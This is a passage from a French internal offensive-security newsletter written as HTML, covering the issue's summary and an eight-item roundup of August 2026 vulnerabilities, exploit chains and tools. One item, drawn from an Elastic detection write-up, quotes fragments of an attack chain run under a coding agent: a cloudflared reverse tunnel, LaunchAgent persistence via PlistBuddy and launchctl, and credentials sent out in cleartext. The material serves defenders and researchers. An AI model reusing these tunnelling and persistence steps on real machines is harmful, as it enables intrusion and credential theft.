@@ -1,0 +1,1093 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="color-scheme" content="light dark">
+<title>OffSec Quotidien n&deg;419</title>
+<!-- No <meta viewport>: its width=device-width is mangled by quoted-printable
+     encoding in transit. No stylesheet, no JS: every style is inline below. -->
+</head>
+<body style="margin:0; padding:0; background-color:#e6e4df; -webkit-text-size-adjust:100%;">
+
+<div style="display:none; font-size:1px; line-height:1px; max-height:0; max-width:0; opacity:0; overflow:hidden; color:#e6e4df;">Attestation Android relay&eacute;e, CSS offensif dans le webmail, et la cha&icirc;ne Langflow au KEV.</div>
+
+<table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; background-color:#e6e4df; margin:0; padding:0;">
+<tr>
+<td align="center" style="padding:24px 12px 40px 12px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">
+
+<table role="presentation" cellpadding="0" cellspacing="0" border="0" width="680" style="width:100%; max-width:680px; border-collapse:collapse; background-color:#fbfaf8; border:1px solid #cfccc4;">
+
+<tr>
+<td style="padding:26px 30px 20px 30px; background-color:#1e1d1b; border-bottom:3px solid #7a4a2e;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse;">
+  <tr>
+    <td style="font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; letter-spacing:2px; text-transform:uppercase; color:#a8a49b; padding-bottom:8px;">Bulletin interne &nbsp;/&nbsp; s&eacute;curit&eacute; offensive &nbsp;/&nbsp; diffusion 1</td>
+  </tr>
+  <tr>
+    <td style="font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:27px; line-height:32px; font-weight:700; color:#f5f3ef; letter-spacing:-0.4px; padding-bottom:10px;">OffSec Quotidien &mdash; n&deg;419</td>
+  </tr>
+  <tr>
+    <td style="font-family:Consolas,'SF Mono',Menlo,monospace; font-size:13px; line-height:20px; color:#c8c3b9;">mercredi 12 ao&ucirc;t 2026 &nbsp;&middot;&nbsp; 06:00 CEST &nbsp;&middot;&nbsp; 6&nbsp;442 mots &nbsp;&middot;&nbsp; ~32 min</td>
+  </tr>
+  <tr>
+    <td style="padding-top:14px;">
+      <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; border-left:3px solid #7a4a2e;">
+      <tr>
+        <td style="padding:2px 0 2px 12px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:14px; line-height:21px; color:#e8e4dc;"><span style="font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; letter-spacing:1px; text-transform:uppercase; color:#a8a49b;">Th&egrave;me de la semaine</span><br><span style="font-weight:600; color:#f5f3ef;">Ce que la preuve ne prouve pas</span> &mdash; Une attestation mat&eacute;rielle relay&eacute;e entre deux t&eacute;l&eacute;phones, un CSS qui exfiltre et enregistre les frappes, et un endpoint qui distribue des JWT SUPERUSER &agrave; qui les demande.</td>
+      </tr>
+      </table>
+    </td>
+  </tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px; background-color:#2a2825;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse;">
+  <tr>
+    <td style="padding:16px 0 8px 0; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; letter-spacing:1.5px; text-transform:uppercase; color:#8f8b82;">Sommaire</td>
+  </tr>
+  <tr><td style="padding:5px 0; border-top:1px solid #3d3a35; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:13px; line-height:19px;"><a href="#partie-1" style="color:#e2ddd3; text-decoration:none;"><span style="color:#7a4a2e; font-weight:700;">01</span> &nbsp; Le fil de la semaine <span style="color:#8f8b82;">&mdash; 8 items</span></a></td></tr>
+  <tr><td style="padding:5px 0; border-top:1px solid #3d3a35; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:13px; line-height:19px;"><a href="#partie-2" style="color:#e2ddd3; text-decoration:none;"><span style="color:#7a4a2e; font-weight:700;">02</span> &nbsp; Attestation Android : la preuve qui ne dit pas d'ou elle vient <span style="color:#8f8b82;">&mdash; ~2 600 mots</span></a></td></tr>
+  <tr><td style="padding:5px 0; border-top:1px solid #3d3a35; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:13px; line-height:19px;"><a href="#partie-3" style="color:#e2ddd3; text-decoration:none;"><span style="color:#7a4a2e; font-weight:700;">03</span> &nbsp; CSS offensif dans le webmail : exfiltration, mutation et keylogging <span style="color:#8f8b82;">&mdash; ~2 500 mots</span></a></td></tr>
+  <tr><td style="padding:5px 0 16px 0; border-top:1px solid #3d3a35; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:13px; line-height:19px;"><a href="#partie-4" style="color:#e2ddd3; text-decoration:none;"><span style="color:#7a4a2e; font-weight:700;">04</span> &nbsp; Autopsie Langflow : le correctif qui a trait&eacute; le sympt&ocirc;me et laisse la porte <span style="color:#8f8b82;">&mdash; ~1 900 mots</span></a></td></tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:24px 20px 4px 20px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; background-color:#f2ecdd; border:2px solid #1e1d1b;">
+  <tr>
+    <td style="padding:16px 18px 6px 18px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:13px; letter-spacing:2px; text-transform:uppercase; font-weight:700; color:#1e1d1b; border-bottom:1px solid #cfc4a8;">TL;DR &mdash; 30 secondes</td>
+  </tr>
+  <tr>
+    <td style="padding:14px 18px 18px 18px;">
+      <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse;">
+      <tr>
+        <td width="22" valign="top" style="width:22px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:16px; line-height:24px; color:#7a4a2e; font-weight:700;">&rsaquo;</td>
+        <td valign="top" style="font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:24px; color:#1e1d1b; padding-bottom:9px;">Quarkslab relaie une attestation mat&eacute;rielle Android intacte depuis un t&eacute;l&eacute;phone propre vers un appareil root&eacute; : toutes les signatures restent valides, parce que la cha&icirc;ne ne prouve &agrave; aucun moment quel appareil la pr&eacute;sente.</td>
+      </tr>
+      <tr>
+        <td width="22" valign="top" style="width:22px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:16px; line-height:24px; color:#7a4a2e; font-weight:700;">&rsaquo;</td>
+        <td valign="top" style="font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:24px; color:#1e1d1b; padding-bottom:9px;">Gareth Heyes transforme le CSS d'un email en canal d'exfiltration et en keylogger, avec des contournements de sanitizer confirm&eacute;s sur Gmail, Outlook, Fastmail, ProtonMail et Yahoo.</td>
+      </tr>
+      <tr>
+        <td width="22" valign="top" style="width:22px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:16px; line-height:24px; color:#7a4a2e; font-weight:700;">&rsaquo;</td>
+        <td valign="top" style="font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:24px; color:#1e1d1b; padding-bottom:9px;">CVE-2026-9198 : deux endpoints Langflow encha&icirc;n&eacute;s donnent un RCE non authentifi&eacute;. Ajout&eacute;e au KEV le 4 ao&ucirc;t, &eacute;ch&eacute;ance f&eacute;d&eacute;rale au 7 ao&ucirc;t, exploit&eacute;e depuis le 6 juillet &mdash; onze jours avant la divulgation.</td>
+      </tr>
+      <tr>
+        <td width="22" valign="top" style="width:22px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:16px; line-height:24px; color:#7a4a2e; font-weight:700;">&rsaquo;</td>
+        <td valign="top" style="font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:24px; color:#1e1d1b;"><span style="font-weight:700;">&Agrave; faire aujourd'hui :</span> si un backend v&eacute;rifie une attestation Android, ajouter le contr&ocirc;le de attestationApplicationId (tag [709]) &mdash; une comparaison de cha&icirc;ne qui casse le relais d&eacute;crit par Quarkslab.</td>
+      </tr>
+      </table>
+    </td>
+  </tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td id="partie-1" style="padding:34px 30px 0 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; border-top:3px solid #1e1d1b;">
+  <tr><td style="padding:10px 0 0 0; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; letter-spacing:2px; text-transform:uppercase; color:#7a4a2e; font-weight:700;">Partie 01</td></tr>
+  <tr><td style="padding:4px 0 6px 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:24px; line-height:29px; font-weight:700; color:#1e1d1b; letter-spacing:-0.3px;">Le fil de la semaine</td></tr>
+  <tr><td style="padding:0 0 4px 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:14px; line-height:21px; color:#5f5c55;">Huit items retenus sur 73 candidats surveill&eacute;s du 5 au 12 ao&ucirc;t.</td></tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Semaine dense c&ocirc;t&eacute; plateforme : un Patch Tuesday &agrave; 398 CVE, neuf ajouts au KEV en neuf jours, et deux publications de recherche qui attaquent la m&ecirc;me hypoth&egrave;se sous des angles oppos&eacute;s &mdash; celle qui veut qu'une v&eacute;rification c&ocirc;t&eacute; serveur prouve quelque chose sur le client qui lui parle. Les deux deep-dives du jour partent de la.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; border-top:1px solid #dcd8d0;">
+  <tr>
+    <td style="padding:16px 0 4px 0;">
+      <table role="presentation" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;">
+      <tr><td style="background-color:#4a6b52; padding:3px 8px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; font-weight:700; letter-spacing:0.5px; color:#f7f5f0; border:1px solid #35513c;">[quick]</td></tr>
+      </table>
+    </td>
+  </tr>
+  <tr><td style="padding:8px 0 0 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:17px; line-height:24px; font-weight:700; color:#1e1d1b;">Patch Tuesday ao&ucirc;t 2026 : 398 CVE, une seule sous exploitation active</td></tr>
+  <tr><td style="padding:5px 0 0 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:22px; color:#403d38;"><span style="color:#7a4a2e; font-weight:700;">Pourquoi &ccedil;a compte&nbsp;:</span> Le ratio est l'information. Microsoft publi&eacute; 398 CVE dont 62 critiques, et une seule est exploit&eacute;e dans la nature : <strong>CVE-2026-68820</strong> (AFD.sys, le driver Ancillary Function pour WinSock), ajout&eacute;e au KEV le jour m&ecirc;me. La ZDI signale par ailleurs <strong>CVE-2026-62878</strong> (Windows DNS Server, stack-based buffer overflow, non authentifi&eacute;e) qu'elle juge potentiellement wormable malgr&eacute; la cotation <em>Exploitation Less Likely</em> de Microsoft, <strong>CVE-2026-62893</strong> (Windows Deployment Services, ex&eacute;cution via UDP/69 dans un sc&eacute;nario PXE standard) et <strong>CVE-2026-62911</strong> (Exchange, &eacute;l&eacute;vation permettant la prise de contr&ocirc;le de toutes les bo&icirc;tes, d&eacute;montr&eacute;e &agrave; Pwn2Own Berlin).</td></tr>
+  <tr><td style="padding:6px 0 16px 0; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; line-height:18px;"><a href="https://www.zerodayinitiative.com/blog/2026/8/11/the-august-2026-security-update-review" style="color:#2f5474; text-decoration:underline;">zerodayinitiative.com&#8203;/blog/2026/8/11/the-august-2026-security-update-review</a> <span style="color:#7d7a73;">&middot; 11 ao&ucirc;t 2026</span></td></tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; border-top:1px solid #dcd8d0;">
+  <tr>
+    <td style="padding:16px 0 4px 0;">
+      <table role="presentation" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;">
+      <tr><td style="background-color:#4a6b52; padding:3px 8px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; font-weight:700; letter-spacing:0.5px; color:#f7f5f0; border:1px solid #35513c;">[quick]</td></tr>
+      </table>
+    </td>
+  </tr>
+  <tr><td style="padding:8px 0 0 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:17px; line-height:24px; font-weight:700; color:#1e1d1b;">Neuf entr&eacute;es au KEV entre le 3 et le 11 ao&ucirc;t, avec des &eacute;ch&eacute;ances &agrave; trois jours</td></tr>
+  <tr><td style="padding:5px 0 0 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:22px; color:#403d38;"><span style="color:#7a4a2e; font-weight:700;">Pourquoi &ccedil;a compte&nbsp;:</span> Dans l'ordre : N-central (CVE-2026-18577 puis CVE-2026-18556), Tomcat (CVE-2026-34486), Langflow (CVE-2026-9198), TeamCity (CVE-2026-63077), LoadMaster (CVE-2026-8037), puis le 11 ao&ucirc;t Cisco ASA/FTD (CVE-2026-20349), AFD.sys (CVE-2026-68820) et Metabase (CVE-2026-72898). Les &eacute;ch&eacute;ances BOD 26-04 tombent &agrave; trois jours de l'ajout &mdash; pour Langflow, ajout&eacute;e le 4, l'&eacute;ch&eacute;ance f&eacute;d&eacute;rale &eacute;tait au 7. C'est la Partie 04 du jour.</td></tr>
+  <tr><td style="padding:6px 0 16px 0; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; line-height:18px;"><a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" style="color:#2f5474; text-decoration:underline;">cisa.gov&#8203;/known-exploited-vulnerabilities-catalog</a> <span style="color:#7d7a73;">&middot; 11 ao&ucirc;t 2026</span></td></tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; border-top:1px solid #dcd8d0;">
+  <tr>
+    <td style="padding:16px 0 4px 0;">
+      <table role="presentation" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;">
+      <tr><td style="background-color:#2f5474; padding:3px 8px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; font-weight:700; letter-spacing:0.5px; color:#f7f5f0; border:1px solid #1f3d57;">[deep-dive]</td></tr>
+      </table>
+    </td>
+  </tr>
+  <tr><td style="padding:8px 0 0 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:17px; line-height:24px; font-weight:700; color:#1e1d1b;">HTTP Terminator : un syst&egrave;me autonome qui invente ses propres triggers de desync</td></tr>
+  <tr><td style="padding:5px 0 0 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:22px; color:#403d38;"><span style="color:#7a4a2e; font-weight:700;">Pourquoi &ccedil;a compte&nbsp;:</span> James Kettle &agrave; laisse tourner un syst&egrave;me autonome sur 30 000 sites, avec de l'ordre d'un milliard de triggers de desynchronisation test&eacute;s par cible, et plus de 700 cibles compromises &mdash; banques am&eacute;ricaines, infrastructure gouvernementale, produits de s&eacute;curit&eacute;. Sorties concr&egrave;tes : de nouveaux triggers (<code>Transfer-Encoding: gzip</code> en HTTP/1.0), un pattern in&eacute;dit &agrave; double <code>Content-Length</code> concordants, la technique du <em>dangling byte</em> qui fiabilise le Response Queue Poisoning, une faille Apache Traffic Server devenue <strong>CVE-2026-63078</strong>, et un concept nouveau, la <em>Shared-Parser Confusion</em>. La conclusion de l'auteur est la partie int&eacute;ressante : la d&eacute;couverte de second ordre est venue de l'humain, pas de la boucle autonome.</td></tr>
+  <tr><td style="padding:6px 0 16px 0; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; line-height:18px;"><a href="https://portswigger.net/research/can-ai-do-novel-security-research" style="color:#2f5474; text-decoration:underline;">portswigger.net&#8203;/research/can-ai-do-novel-security-research</a> <span style="color:#7d7a73;">&middot; 5 ao&ucirc;t 2026</span></td></tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; border-top:1px solid #dcd8d0;">
+  <tr>
+    <td style="padding:16px 0 4px 0;">
+      <table role="presentation" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;">
+      <tr><td style="background-color:#4a6b52; padding:3px 8px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; font-weight:700; letter-spacing:0.5px; color:#f7f5f0; border:1px solid #35513c;">[quick]</td></tr>
+      </table>
+    </td>
+  </tr>
+  <tr><td style="padding:8px 0 0 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:17px; line-height:24px; font-weight:700; color:#1e1d1b;">Elastic : des agents de codage qui publient un dashboard local sur Internet</td></tr>
+  <tr><td style="padding:5px 0 0 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:22px; color:#403d38;"><span style="color:#7a4a2e; font-weight:700;">Pourquoi &ccedil;a compte&nbsp;:</span> Cha&icirc;ne observ&eacute;e le 23 juillet, sous ascendance d'un agent de codage sign&eacute; et donc approuv&eacute; : le processus fils <code>zsh</code> monte un tunnel inverse via <code>cloudflared</code> (<code>*.trycloudflare[.]com</code>) ou localhost.run, puis installe la persistance avec <code>PlistBuddy -c "Set :StartInterval 60"</code> sur un LaunchAgent et <code>launchctl bootstrap gui/$(id -u)/...</code>. Le tunnel est maintenu vivant par un <code>curl</code> de liveness, et des identifiants transitent en clair dans des POST vers le hostname &eacute;ph&eacute;m&egrave;re. L'angle mort est l'ascendance : le parent est de confiance, l'action ne l'est pas.</td></tr>
+  <tr><td style="padding:6px 0 16px 0; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; line-height:18px;"><a href="https://www.elastic.co/security-labs/coding-agent-launchagent-tunnel-detection" style="color:#2f5474; text-decoration:underline;">elastic.co&#8203;/security-labs/coding-agent-launchagent-tunnel-detection</a> <span style="color:#7d7a73;">&middot; 7 ao&ucirc;t 2026</span></td></tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; border-top:1px solid #dcd8d0;">
+  <tr>
+    <td style="padding:16px 0 4px 0;">
+      <table role="presentation" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;">
+      <tr><td style="background-color:#7a4a2e; padding:3px 8px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; font-weight:700; letter-spacing:0.5px; color:#f9f6f1; border:1px solid #5c3620;">[PoC/lab]</td></tr>
+      </table>
+    </td>
+  </tr>
+  <tr><td style="padding:8px 0 0 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:17px; line-height:24px; font-weight:700; color:#1e1d1b;">D&eacute;tecter la suppression du cooldown npm en 40 lignes de CEL</td></tr>
+  <tr><td style="padding:5px 0 0 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:22px; color:#403d38;"><span style="color:#7a4a2e; font-weight:700;">Pourquoi &ccedil;a compte&nbsp;:</span> Le d&eacute;lai de quarantaine npm est une protection qu'on d&eacute;sactive dans <code>.npmrc</code>, et cette d&eacute;sactivation ne produit aucun &eacute;v&eacute;nement : rien &agrave; suivre dans un log. Elastic contourne le probl&egrave;me par snapshot p&eacute;riodique du fichier plutot que par tailing. Reproductible en l'&eacute;tat, et transposable &agrave; toute protection dont l'&eacute;tat vit dans un fichier de configuration au lieu d'un journal.</td></tr>
+  <tr><td style="padding:6px 0 16px 0; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; line-height:18px;"><a href="https://www.elastic.co/security-labs/npm-cooldown-removal-detection-elastic-agent" style="color:#2f5474; text-decoration:underline;">elastic.co&#8203;/security-labs/npm-cooldown-removal-detection-elastic-agent</a> <span style="color:#7d7a73;">&middot; 7 ao&ucirc;t 2026</span></td></tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; border-top:1px solid #dcd8d0;">
+  <tr>
+    <td style="padding:16px 0 4px 0;">
+      <table role="presentation" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;">
+      <tr><td style="background-color:#2f5474; padding:3px 8px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; font-weight:700; letter-spacing:0.5px; color:#f7f5f0; border:1px solid #1f3d57;">[deep-dive]</td></tr>
+      </table>
+    </td>
+  </tr>
+  <tr><td style="padding:8px 0 0 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:17px; line-height:24px; font-weight:700; color:#1e1d1b;">ConfigManBearPig 2.0 : la couverture SCCM passe &agrave; 30+ techniques</td></tr>
+  <tr><td style="padding:5px 0 0 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:22px; color:#403d38;"><span style="color:#7a4a2e; font-weight:700;">Pourquoi &ccedil;a compte&nbsp;:</span> R&eacute;&eacute;criture PowerShell vers Python, avec ce que cela implique op&eacute;rationnellement : support SOCKS, authentification par NT hash ou ticket Kerberos, ex&eacute;cution parall&egrave;le multi-cibles, compatibilit&eacute; Linux, et environ 56 % de gain de vitesse en test. La couverture annoncee est in&eacute;gale et c'est honn&ecirc;te de leur part &mdash; TAKEOVER 9/9 et EXEC 2/2, mais CRED 1/8 et COERCE 0/2. Livre avec OpenHound, le framework de collecte Python.</td></tr>
+  <tr><td style="padding:6px 0 16px 0; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; line-height:18px;"><a href="https://specterops.io/blog/2026/08/03/configmanbearpig-2-0/" style="color:#2f5474; text-decoration:underline;">specterops.io&#8203;/blog/2026/08/03/configmanbearpig-2-0/</a> <span style="color:#7d7a73;">&middot; 3 ao&ucirc;t 2026</span></td></tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; border-top:1px solid #dcd8d0;">
+  <tr>
+    <td style="padding:16px 0 4px 0;">
+      <table role="presentation" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;">
+      <tr><td style="background-color:#5c5a55; padding:3px 8px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; font-weight:700; letter-spacing:0.5px; color:#f7f5f0; border:1px solid #43413d;">[archive]</td></tr>
+      </table>
+    </td>
+  </tr>
+  <tr><td style="padding:8px 0 0 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:17px; line-height:24px; font-weight:700; color:#1e1d1b;">Rappel : la cha&icirc;ne 0-click Pixel 10 de Project Z&eacute;ro, deux bugs jusqu'a root</td></tr>
+  <tr><td style="padding:5px 0 0 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:22px; color:#403d38;"><span style="color:#7a4a2e; font-weight:700;">Pourquoi &ccedil;a compte&nbsp;:</span> Remis en avant parce que la Partie 02 parle d'attestation Android et que cette cha&icirc;ne montre ce que vaut le maillon mat&eacute;riel quand le noyau tombe. Deux bugs : <strong>CVE-2025-54957</strong> dans le d&eacute;codeur Dolby pour l'entree 0-click, puis un handler <code>mmap</code> du driver VPU (mat&eacute;riel WAVE677DV du Tensor G5) qui laisse l'userspace mapper autant de m&eacute;moire physique qu'il veut depuis la r&eacute;gion de registres du VPU. Deux d&eacute;tails de mitigation valent le d&eacute;tour : RET PAC ayant remplace <code>-fstack-protector</code>, la cible d'ecrasement habituelle <code>__stack_chk_fail</code> &agrave; disparu et les auteurs sont passes par <code>dap_cpdp_init</code> ; et le noyau r&eacute;sidant toujours &agrave; la m&ecirc;me adresse physique, KASLR ne prot&egrave;ge rien sur ce chemin.</td></tr>
+  <tr><td style="padding:6px 0 16px 0; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; line-height:18px;"><a href="https://projectzero.google/2026/05/pixel-10-exploit.html" style="color:#2f5474; text-decoration:underline;">projectzero.google&#8203;/2026/05/pixel-10-exploit.html</a> <span style="color:#7d7a73;">&middot; 13 mai 2026</span></td></tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; border-top:1px solid #dcd8d0;">
+  <tr>
+    <td style="padding:16px 0 4px 0;">
+      <table role="presentation" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;">
+      <tr><td style="background-color:#7a4a2e; padding:3px 8px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; font-weight:700; letter-spacing:0.5px; color:#f9f6f1; border:1px solid #5c3620;">[PoC/lab]</td></tr>
+      </table>
+    </td>
+  </tr>
+  <tr><td style="padding:8px 0 0 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:17px; line-height:24px; font-weight:700; color:#1e1d1b;">Paged Out! #9 disponible, appel &agrave; articles pour le #10 jusqu'au 30 septembre</td></tr>
+  <tr><td style="padding:5px 0 0 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:22px; color:#403d38;"><span style="color:#7a4a2e; font-weight:700;">Pourquoi &ccedil;a compte&nbsp;:</span> Le #9 est sorti en juillet ; le #10 est en pr&eacute;paration avec 74 articles d&eacute;j&agrave; rassembl&eacute;s. Format inchange : une page, un sujet, pas de place pour le remplissage. La date limite de soumission est le 30 septembre 2026 (EoD AoE).</td></tr>
+  <tr><td style="padding:6px 0 18px 0; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; line-height:18px;"><a href="https://pagedout.institute/" style="color:#2f5474; text-decoration:underline;">pagedout.institute&#8203;/</a> <span style="color:#7d7a73;">&middot; juillet 2026</span></td></tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:8px 30px 30px 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; background-color:#f1efea; border:1px solid #dcd8d0;">
+  <tr><td style="padding:12px 16px 8px 16px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; letter-spacing:1.5px; text-transform:uppercase; color:#5f5c55; font-weight:700; border-bottom:1px solid #dcd8d0;">Sources &mdash; partie 01</td></tr>
+  <tr>
+    <td style="padding:12px 16px 14px 16px;">
+      <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; font-family:Consolas,'SF Mono',Menlo,monospace;">
+      <tr>
+        <td width="30" valign="top" style="width:30px; font-size:12px; line-height:19px; color:#7a4a2e; font-weight:700; padding-bottom:6px;">[1]</td>
+        <td valign="top" style="font-size:12px; line-height:19px; color:#403d38; padding-bottom:6px; word-break:break-word;"><span style="color:#1e1d1b; font-weight:700;">2026-08-11</span> &nbsp;&middot;&nbsp; Zero Day Initiative &mdash; <a href="https://www.zerodayinitiative.com/blog/2026/8/11/the-august-2026-security-update-review" style="color:#2f5474;">The August 2026 Security Update Review</a></td>
+      </tr>
+      <tr>
+        <td width="30" valign="top" style="width:30px; font-size:12px; line-height:19px; color:#7a4a2e; font-weight:700; padding-bottom:6px;">[2]</td>
+        <td valign="top" style="font-size:12px; line-height:19px; color:#403d38; padding-bottom:6px; word-break:break-word;"><span style="color:#1e1d1b; font-weight:700;">2026-08-11</span> &nbsp;&middot;&nbsp; CISA &mdash; <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" style="color:#2f5474;">Known Exploited Vulnerabilities Catalog, catalogVersion 2026.08.11</a></td>
+      </tr>
+      <tr>
+        <td width="30" valign="top" style="width:30px; font-size:12px; line-height:19px; color:#7a4a2e; font-weight:700; padding-bottom:6px;">[3]</td>
+        <td valign="top" style="font-size:12px; line-height:19px; color:#403d38; padding-bottom:6px; word-break:break-word;"><span style="color:#1e1d1b; font-weight:700;">2026-08-05</span> &nbsp;&middot;&nbsp; James Kettle, PortSwigger Research &mdash; <a href="https://portswigger.net/research/can-ai-do-novel-security-research" style="color:#2f5474;">Can AI do novel security research? Meet the HTTP Terminator</a></td>
+      </tr>
+      <tr>
+        <td width="30" valign="top" style="width:30px; font-size:12px; line-height:19px; color:#7a4a2e; font-weight:700; padding-bottom:6px;">[4]</td>
+        <td valign="top" style="font-size:12px; line-height:19px; color:#403d38; padding-bottom:6px; word-break:break-word;"><span style="color:#1e1d1b; font-weight:700;">2026-08-07</span> &nbsp;&middot;&nbsp; Elastic Security Labs &mdash; <a href="https://www.elastic.co/security-labs/coding-agent-launchagent-tunnel-detection" style="color:#2f5474;">Living off the coding agent: Two tales of tunnels and LaunchAgents</a></td>
+      </tr>
+      <tr>
